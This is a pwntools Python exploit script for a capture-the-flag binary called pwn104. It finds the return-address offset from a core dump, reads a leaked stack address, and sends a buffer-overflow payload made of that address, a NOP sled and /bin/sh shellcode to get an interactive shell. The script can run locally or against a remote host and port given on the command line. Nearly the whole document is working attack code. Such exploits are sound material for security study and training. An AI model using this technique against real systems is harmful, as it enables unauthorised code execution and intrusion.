from pwn import *
import os
import glob


shellcode = asm(shellcraft.sh())

# Allows easy swapping between local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDB script below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_latest_corefile():
    core_pattern = '/var/lib/apport/coredump/core.*'
    core_files = sorted(glob.glob(core_pattern), key=os.path.getmtime, reverse=True)
    if not core_files:
        log.error("No core dump files found")
        return None
    return core_files[0]

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    #p.sendlineafter(b'at', payload)
    p.sendline(payload)
    # Wait for the process to crash
    p.wait()
    # Find the latest core dump file
    core_path = find_latest_corefile()
    if not core_path:
        log.error("Failed to find core dump file")
        return None
    log.info(f'Using core dump file: {core_path}')
    core = Coredump(core_path)
    if not core:
        log.error("Failed to load corefile")
        return None
    # Print out the address of RIP at the time of crashing
    rip_offset = cyclic_find(core.read(core.sp, 8))  # x64
    info('located RIP offset at {a}'.format(a=rip_offset))
    return rip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pwn104-1644300377109.pwn104'


# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

shellcode = asm(shellcraft.sh())
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

io.recvuntil("at ")
addr = io.recvn(14)

print("Het adres is: %s" % str(addr))
#hexaddr = int(addr, 16)
hexaddr = int(addr.strip(), 16)
hexaddr = hexaddr + 96


# Build the payload
payload = flat({
    offset: [
    p64(hexaddr, endian='little'),
    b"\x90"*20,
    shellcode
    ]
})
write('payload', payload)

# Send the payload
io.sendline(payload)
#io.recvuntil(b'Thank you!')

# Got Shell?
io.interactive()
